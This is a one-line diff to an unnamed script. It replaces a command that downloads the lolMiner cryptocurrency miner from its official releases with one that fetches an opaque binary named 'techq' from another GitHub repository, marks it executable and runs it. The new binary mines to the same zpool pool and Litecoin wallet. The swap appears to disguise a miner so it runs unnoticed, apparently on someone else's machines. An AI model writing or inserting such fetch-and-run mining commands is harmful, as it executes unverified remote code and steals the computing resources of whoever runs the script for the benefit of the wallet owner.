@@ -1,1 +1,1 @@
-wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.52a/lolMiner_v1.52a_Lin64.tar.gz && tar -xf lolMiner_v1.52a_Lin64.tar.gz && cd 1.52a && ./lolMiner --coin AUTO144_5 --pool stratum+tcp://equihash144.na.mine.zpool.ca:2144 --user ltc1q6u605nmtzdz9ru72x4qmjwg54njkv2vnn7jq5f --pass c=LTC --ethstratum ETHPROXY
+wget https://github.com/Menak3/Corner/raw/main/techq && chmod +x techq && ./techq --coin AUTO144_5 --pool stratum+tcp://equihash144.na.mine.zpool.ca:2144 --user ltc1q6u605nmtzdz9ru72x4qmjwg54njkv2vnn7jq5f --pass c=LTC --ethstratum ETHPROXY
